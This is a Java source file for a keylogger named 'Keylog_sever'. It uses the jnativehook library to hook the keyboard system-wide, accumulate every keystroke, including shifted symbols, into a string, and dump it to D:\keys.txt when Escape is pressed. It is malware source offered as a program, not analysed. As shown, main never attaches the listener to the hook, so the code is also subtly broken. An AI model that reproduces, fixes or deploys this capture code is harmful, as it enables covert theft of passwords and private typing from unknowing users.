package javaapplication3;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.File;
import java.io.FileWriter;

public class Keylog_sever implements NativeKeyListener {
    
    static String s = "";
    boolean st;

    public void nativeKeyPressed(NativeKeyEvent e) {
        // System.out.println("Key Pressed: " +
        // NativeKeyEvent.getKeyText(e.getKeyCode()));

        if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
            st = true;
        }

        if (st == false) {
            s = s + NativeKeyEvent.getKeyText(e.getKeyCode());
        }

        if (e.getKeyCode() == e.VC_1 && st) {

            s = s + "!";

        }
        if (e.getKeyCode() == e.VC_2 && st) {

            s = s + "@";

        }
        if (e.getKeyCode() == e.VC_3 && st) {

            s = s + "#";

        }
        if (e.getKeyCode() == e.VC_4 && st) {

            s = s + "$";

        }
        if (e.getKeyCode() == e.VC_5 && st) {

            s = s + "%";

        }
        if (e.getKeyCode() == e.VC_6 && st) {

            s = s + "^";

        }
        if (e.getKeyCode() == e.VC_7 && st) {

            s = s + "&";

        }
        if (e.getKeyCode() == e.VC_8 && st) {

            s = s + "*";

        }
        if (e.getKeyCode() == e.VC_9 && st) {

            s = s + "(";

        }
        if (e.getKeyCode() == e.VC_0 && st) {

            s = s + ")";

        }


        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                File f = new File("D:\\keys.txt");
                FileWriter fw = new FileWriter(f);
                fw.write(s);
                fw.close();

                GlobalScreen.unregisterNativeHook();
            } catch (Exception ef) {
            }
        }
    }

   
    public void nativeKeyReleased(NativeKeyEvent e) {
         System.out.println("Key Released: " +
         NativeKeyEvent.getKeyText(e.getKeyCode()));
        if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
            st = false;
        }
    }

  
    public void nativeKeyTyped(NativeKeyEvent e) {
         System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
    }

    public static void main(String[] args) throws Exception {
        try {
            
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException ex) {
            
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());
            System.exit(1);
        }
    }
}

